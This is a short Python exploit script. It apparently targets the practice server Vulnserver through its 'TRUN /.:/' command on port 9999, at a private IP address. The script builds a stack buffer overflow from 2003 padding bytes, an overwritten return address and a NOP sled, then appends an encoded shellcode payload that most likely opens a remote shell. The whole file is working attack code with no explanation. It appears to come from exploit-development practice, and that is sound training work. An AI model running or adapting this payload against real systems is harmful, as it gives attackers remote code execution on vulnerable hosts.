#!/usr/bin/env python3
import socket
import struct

s = socket.socket()
s.connect( ( "192.168.152.232", 9999 ) )

total_length = 2984

offset = 2003

new_eip = struct.pack("<I", 0x62501203)

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xdb\x3b\x9b\xdd\x83\xee\xfc\xe2\xf4"
buf += b"\x27\xd3\x14\xdd\xdb\x3b\xfb\xec\x09\xb2\x7e\xb9"
buf += b"\x50\x69\xab\x56\x89\x37\x10\x8f\xcf\x34\x2c\x97"
buf += b"\xfd\x0a\x64\x56\xa9\x13\xaa\x1d\x77\x07\xfa\xa1"
buf += b"\xd9\x17\xbb\x1c\x14\x36\x9a\x1a\x92\x4e\x74\x8f"
buf += b"\x50\x69\x8b\x8a\x50\x79\xa7\xdc\x0b\xb0\xdb\xa5"
buf += b"\x5e\xfb\xef\x91\xda\xeb\x10\x95\xc3\x6b\x10\x85"
buf += b"\xfb\x3a\x48\x58\x12\x4f\xa7\x94\xea\xc4\x10\xe9"
buf += b"\x50\x3a\x4d\xec\x1b\xfa\x54\xd0\x77\x3a\x5c\xe5"
buf += b"\x3b\x4e\x6f\xde\xa6\xc3\xa0\xa0\xff\x4e\x7b\x85"
buf += b"\x50\x63\xbf\xdc\x08\x5d\x10\xd1\x90\xb0\xc3\xc1"
buf += b"\xda\xe8\x10\xd9\x50\x3a\x4b\x54\x9f\x1f\xbf\x86"
buf += b"\x80\x5a\xc2\x87\x8a\xc4\x7b\x85\x84\x61\x10\xcf"
buf += b"\x32\xbb\x64\x22\x24\x66\xf3\xee\xe9\x3b\x9b\xb5"
buf += b"\xac\x48\xa9\x82\x8f\x53\xd7\xaa\xfd\x3c\x12\x35"
buf += b"\x24\xeb\x23\x4d\xda\x3b\x9b\xf4\x1f\x6f\xcb\xb5"
buf += b"\xf2\xbb\xf0\xdd\x24\xee\xf1\xd7\xb3\x97\x82\x21"
buf += b"\xfc\x53\x99\xdd\xca\x67\x12\x3b\x8b\x6b\xcb\x8d"
buf += b"\x9b\x6b\xdb\x8d\xb3\xd1\x94\x02\x3b\xc4\x4e\x4a"
buf += b"\xb1\x2b\xcd\x8a\xb3\xa2\x3e\xa9\xba\xc4\x4e\x58"
buf += b"\x1b\x4f\x91\x22\x95\x33\xee\x31\x33\x5c\x9b\xdd"
buf += b"\xdb\x51\x9b\xb7\xdf\x6d\xcc\xb5\xd9\xe2\x53\x82"
buf += b"\x24\xee\x18\x25\xdb\x45\xad\x56\xed\x51\xdb\xb5"
buf += b"\xdb\x2b\x9b\xdd\x8d\x51\x9b\xb5\x83\x9f\xc8\x38"
buf += b"\x24\xee\x08\x8e\xb1\x3b\xcd\x8e\x8c\x53\x99\x04"
buf += b"\x13\x64\x64\x08\x58\xc3\x9b\xa0\xf3\x63\xf3\xdd"
buf += b"\x9b\x3b\x9b\xb7\xdb\x6b\xf3\xd6\xf4\x34\xab\x22"
buf += b"\x0e\x6c\xf3\xa8\xb5\x76\xfa\x22\x0e\x65\xc5\x22"
buf += b"\xd7\x1f\x94\x58\xab\xc4\x64\x22\x32\xa0\x64\x22"
buf += b"\x24\x3a\x58\xf4\x1d\x4e\x5a\x1e\x60\xcb\x2e\x7f"
buf += b"\x8d\x51\x9b\x8e\x24\xee\x9b\xdd"

shellcode = buf


payload = [ 
	b"TRUN /.:/",
	b"A" * offset,
	new_eip,
	nop_sled,
	shellcode,
	b"C" * 100
]
payload = b"".join(payload)


s.send(payload)

s.close()
